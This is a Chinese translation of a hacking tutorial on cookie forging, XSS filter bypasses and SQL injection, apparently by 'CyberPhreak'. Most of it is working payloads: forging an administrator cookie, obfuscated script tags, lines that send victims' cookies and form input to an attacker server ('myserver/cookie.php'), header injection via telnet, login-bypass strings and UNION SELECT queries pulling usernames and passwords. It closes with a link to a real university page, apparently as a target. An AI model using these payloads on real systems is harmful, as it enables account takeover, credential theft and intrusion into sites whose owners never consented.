@@ -1,0 +1,293 @@
+XSS & SQL注入
+文章作者：CyberPhreak
+译文作者：黯魂 [S.S.T]
+
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 
+X Web Security - XSS & more X 
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 
+
+
+~介绍
+
+在这篇文章中我将说明所有关于XSS以及更多相关的知识.通过这篇文档,我希望能让你明白什么是XSS,为什么使用XSS,以及怎样使用XSS.一旦你学会了,你将需要发挥自己的创造力,因为大多数人都修补了简单的XSS漏洞.但是他们所忘记做的是修补比XSS的一个字符串更多的漏洞,并且php中特殊安全机制被用来防御XSS,而取代他们自己的方法.同时我将阐述的不仅仅是XSS,而是所有的web安全.
+
+XXXXXXXXXXXXXXXXXXXXX 
+X Table OF Contents X 
+XXXXXXXXXXXXXXXXXXXXX 
+
+XXXXXXXXXXXXXXXXXXXX 
+X Cookie Editing X 
+X XSS X 
+X SQL Injection X 
+XXXXXXXXXXXXXXXXXXXX
+
+~什么是cookie
+
+cookie就是一块数据.一旦你浏览一个站点并且注册一个帐号,一个cookie就被设置以记录你的信息.cookie仅仅保存你登录的信息以使站点检测以前你是否登录过,如果不是,它就会检测你的用户名和密码的正确性,然后登录.比如说在一个夜总会,你买了一张票,他们就会给你一张卡.因此你可以进进出出而不用每次都买票.而cookies比你所能看到的要复杂得多.夜总会只能记住你一晚上,但是cookies却能记住你一辈子.
+
+~警告&欺骗
+
+那么现在你知道了cookie是什么...你如何看待它们?事实上,cookie编辑(修改)是最简单的方法之一.只要有一个浏览器,你就能够查看和编辑cookies,并且只需要一些基础的javascript知识.打开你的浏览器然后随便去一个网站吧,登录...现在输入javascript:alert(document.cookie).这时你应该可以看见一个用户名和密码.然而大多数站点现在都不使用cookies,而使用sessions.很遗憾,sessions不能被修改(服务端可以),不像cookies,一旦你修改了一个cookie你就可以欺骗你自己.现在让我们开始欺骗...假设你看到了一个警告框并且看到一些像这样的内容:
+
+strusername=cnsst;strpassword=cnsst
+
+此时假设你知道'bitch'是一个管理员,可是你不知道密码. 由于脆弱的安全机制你不需要密码:javascript:void(document.cookie="strusername=bitch")
+现在输入:javascript:alert(document.cookie).那几乎非常接近cookie修改了...
+
+~什么是XSS
+
+XSS,或者CSS,不管你更喜欢怎样称呼它,XSS(CSS)都代表着跨站脚本.基本上意思就是你能以任何方式注入脚本,来让它完成你想要做的.通过XSS你也可以截获输入信息,像用户名,密码以及cookies.这都将被讨论,所以接下来将会有很多例子,我们这篇文章应该能够帮你在XSS上发挥自己的创造力.
+
+~为什么使用XSS
+
+很明显的问题,通过XSS你能在客户端和服务器端执行任何类型的脚本.然而XSS却不仅仅局限于执行脚本上,还能截获输入.输入类似:<input name="name" type="name">
+你通过XSS截获输入,然后通过一个秘密文件把截获到的信息发送向你的站点.而这一切绝不是XSS所能实现的全部作用.XSS还能截获cookies.Cookies保存着有价值的信息,像用户名,密码等等.
+
+~让我们开始吧…
+
+我假定你知道html和javascript,而php知识也有帮助,但却不是必要的.让我们从这个php脚本开始.
+
+XSS--跨站脚本&lt;html&gt; 
+
+&lt;body&gt; 
+
+&lt;form action="" method="GET"&gt; 
+
+&lt;!-- 我使用的GET方法,因为当我们利用的时候更容易练习. --&gt; 
+
+Script: &lt;input name="name" type="name"&gt; 
+
+&lt;input type="submit" value="submit"&gt; 
+
+&lt;/form&gt; 
+
+&lt;/body&gt; 
+
+&lt;/html&gt; 
+
+
+
+&lt;?php 
+
+$name = $_GET['name']; 
+
+echo("Hello $name"); 
+
+?&gt;
+复制代码OK,我们应该都知道上面的代码有什么用...这是一个非常奇怪的脚本,没有一个人会在自己的站点上使用它(至少我没见过),但是它对初学者理解原理却真的很有用.来看看我输入后所得到的信息:
+
+cnsst
+"Hello cnsst!"
+
+引号内的信息就是输出信息..注意看,现在我输入:
+<script>alert(document.cookie)</script> 
+
+那么它将会弹出document.cookie!所以它是易受XSS攻击的!
+
+现在我们已经对XSS有了一点了解,那让我们理解它.首先,脚本做的是取得你的输入然后粘贴它.嗯...也就是说我们能输入任何数据.所以?等等...任何数据...好的,你想问客户端和服务器端分别有什么语言? 让我告诉你,基本上客户端语言是建立在你客户端浏览器之上的:JavaScript,html, VBScript等等...
+
+服务器端语言在另一边,不是建立在你客户端之上的,而建立在服务器之上,有php,asp等等...
+
+已有一些方法注入php,稍后我将说明.现在先想想这怎样才能对我们有帮助?注入javascript?简单.比如说你正在编写一个网站程序,由于是你的站点,所以你能使用所有你想使用的javascript(JS).因此其他任何人也可以,因为XSS允许你让网站运行你想要运行的任何脚本.
+
+让我们看一个稍微复杂点的例子!
+
+假设你已经输入了<script>alert(document.cookie)</script>,并且回显是这样的:
+scriptalert(document.cookie)/script
+或者可能是这样的:
+scriptalertdocument.cookie/script
+
+可以看出更难利用了...不过有很多方法使用XSS,这只是其中一种.而且是其中最烂的方法之一.你看到当中的"<>"都被空字符" "替换了.
+
+让我们继续利用:
+<<script>>alert(document.cookie)<</script>> 
+
+你的输出将弹出document.cookie.
+
+现在来看看更狠的:
+<<script>>alert((document.cookie))<<//script>>
+
+
+他们可能会替换所有的,或者只是"<>".所以如果一对不能得以执行,另一对就可以.现在,如果你看到:
+scriptalertdocument.cookie/script 
+或者 <<<script>>>alert(document.cookie)<<</script>>>  
+
+他们可能替换2对来欺骗你,或者替换一些字母.试着用你自己的方法来利用...你输入:
+<script>alert(document.cookie)</script>
+
+输出像这样:srplert(document.cookie)srp
+
+仔细观察,你就会发现document.cookie中并没有什么被替换.为什么呢? 因为他们并不清楚你想要alert什么,以及你想做什么.所以他们只是猜测,就只阻止了"<>"以及script部分.怎么绕过?看看这个:
+<<sccriiptt>>aalert(document.cookie)<<//sccriiptt>>
+
+所有重复多余的部分刚好被替换!现在让我们来点更高级的!
+
+这次他们使用的仍然是替换,但是却检查了整个字符串!例如:
+<script>alert(document.cookie)</script> 
+
+输出将是:
+scriptalert(document.cookie)script
+
+看到这,你激动地说,"我知道该怎么做了!" OK,让我们按照你的方法来重新构造:
+<<script>>alert(document.cookie)<</script>> 
+
+输出:scriptalert(document.cookie)script. 这时你可能会继续增加更多的<>.可是,他们替换了任何"<>",无论你输入多少个...看到我说"任何"了吗?使用下面这个例子:
+
+< 
+script 
+> 
+alert 
+( 
+document 
+. 
+cookie 
+) 
+< 
+/ 
+script 
+>
+
+
+看看它,它没有替换"<>",它替换代码关键字.所以即便你写的是一句没有"<>"的代码,将仍然被替换,这就是我们为什么这样写的原因.假如对方使用更严格的标准,替换任何类型的代码,甚至是"alert"! 我们又该怎么改进呢?看看这个:
+<
+s 
+c 
+r 
+i 
+p 
+t 
+> 
+a 
+l 
+e 
+r 
+t 
+( 
+d 
+o 
+c 
+u 
+m 
+e 
+n 
+t 
+. 
+c 
+o 
+o 
+k 
+i 
+e 
+) 
+< 
+/ 
+s 
+c 
+r 
+i 
+p 
+t 
+/ 
+>
+
+这下应该可以了,但是如果他们仍然替换"<",你可以增加2对"<< >>"(并且你可以用任何字符取代document.cookie)
+
+还有更多我可以演示的替换,但是我教你的只是想让你发挥自己的创造力.
+
+现在让我来讲讲其他XSS方法.前面我们已经讨论了客户端XSS,那么现在就来看看服务器端XSS.
+
+首先让我说明它们之间的区别.客户端是从你浏览器经解释语言,如JavaScript (JS) VBScript (VBS)等而看到的.服务器端XSS是通过来自服务器端的语言,如php,asp等的XSS.客户端通过浏览器查看,服务器端通过服务器查看.
+
+我们已经学会了怎样构造客户端XSS,而构造服务器端我们必须注入脚本到服务器上.要完成这个,我们需要找到一个像任何XSS的脚本,但是这个脚本能够保存你的XSS到服务器中.现在,假设你在一个网站上发表了一篇文章,现在要做的是取代文章,用XSS,为什么我们应该用JavaScript?为什么不用php?但是先让我给你看点东西.
+document.forms(0).action ="http://myserver/myscript.php
+这既能在服务器端也能在客户端,没有关系.因此你的脚本将复制他们所输入的信息到那个表单中,并保存在我们站点上的一个*.txt文件中.
+
+再次假设你在网站上注册了一个帐号,并且可以自定义资料...
+document.images(0).src="http://myserver/cookie.php"+document.cookie.
+或者如果你有空间可以存放指向自定义内容的链接,你可以输入:
+javascript:location.href="http://myserver/cookie.php"+document.cookie 
+这将截获访问我们资料的用户的cookie.这可以用于任何地方而不仅仅在资料上,它只是一个例子.
+
+有时一个站点会回显你的UserAgent和Referer...现在让我们在DOS提示符下或者命令行窗口中试一试一些XSS,
+telnet example.com 
+GET /page/toplacewhere_itechos_your_useragent.php HTTP/1.1 
+User-Agent: &lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+Referer: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+~什么是SQL注入
+
+SQL注入,网站中最大的安全问题之一.那么到底什么是SQL注入?其实也就是注入SQL.现在让我们来挖掘不同级别的SQL漏洞.假设你有一个像这样的登录页面:&lt;html&gt; 
+
+&lt;body&gt; 
+
+&lt;form action="" method="POST"&gt; 
+
+Username: &lt;input name="name" type="name"&gt; 
+
+Password: &lt;input name="password" type="password"&gt; 
+
+&lt;input type="submit" type="submit" value="Submit"&gt; 
+
+&lt;/form&gt; 
+
+&lt;/body&gt; 
+
+&lt;/html&gt;
+复制代码这里面有一个XSS漏洞,但是不用担心它,没有办法猜出或者破解出密码.所以,我们该怎么办?SQL注入!
+
+最简单的攻击是在用户名和密码那里输入"'".如果没有保护机制,此时你应该得到一个错误信息.如果你得到了,它就是极易受攻击的.可是错误信息毫无价值,除非你知道如何利用它.所以,我会给你一个你可以使用的注入列表,以便在你得到一个单引号的错误信息时使用.
+
+'=' 
+'OR 1=1-- 
+'OR a=a-- 
+'OR'
+
+自从人们增强安全性以后,现在这些注入就很难发挥作用了,但是下面这个列表却是很多人在安全列表里没有注意到的:
+
+'OR''=' 
+'OR"=" 
+'OR'=" 
+'OR '=" 
+'OR "=' 
+'OR ''=' 
+'OR '='' 
+'OR "='' 
+'OR ''="
+
+
+~
+现在让我说明UNION ALL SELECT声明,这将选出数据库中的一个表...所显示的内容取决于你所选择的列.
+UNION ALL SELECT username,password FROM users
+
+这个查询语句将执行,但是….如果毫无作用呢?
+UNION ALL SELECT username,password FROM users WHERE username='OR "=' 
+AND password='OR "='
+
+你可能使用其他字符来替代'OR "='以注入存在的注入点.可是首先考虑一下,你是怎么知道表名的?实际上,你发现了一个SQL漏洞,它给了你错误信息,而错误信息包含了表名.
+
+一旦你发现了漏洞,你就会按照习惯去用类似'OR "='的方法去进行注入,以得到表名.有时候你想从表中查询一些有用的数据,你却不得不选择所有的表,因为你并不知道所要查询的数据在哪个表里.下面的例子中存在20个不同表名的表,你试图查询一个ip的列表:
+UNION ALL SELECT 
+ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip,ip FROM logs 
+WHERE ip='OR''="
+
+现在你看到这个了吗?(我确信你已经看到了)
+http://example.com/index.php?article=34 
+那将浏览Id为34的文章...让我们用"'"替换34:
+http://example.com/index.php?article=' 
+
+
+现在,记住我所说的,大多数人都没有意识到'所带来的不安全性,你总是能够尝试不同的注入方法,这里是一些例子:
+http://example.com/index.php?article=' 
+http://example.com/index.php?article='=' 
+http://example.com/index.php?article='OR 1=1-- 
+http://example.com/index.php?article='OR a=a-- 
+http://example.com/index.php?article='OR '=" 
+http://example.com/index.php?article='OR "=' 
+http://example.com/index.php?article='OR ''=' 
+http://example.com/index.php?article='OR '='' 
+http://example.com/index.php?article='OR''=' 
+http://example.com/index.php?article='OR"'=' 
+http://example.com/index.php?article='OR"''=' 
+
+尽情发挥自己的创造力! 
+http://www.ie.tsinghua.edu.cn/notice/show.php?id=704
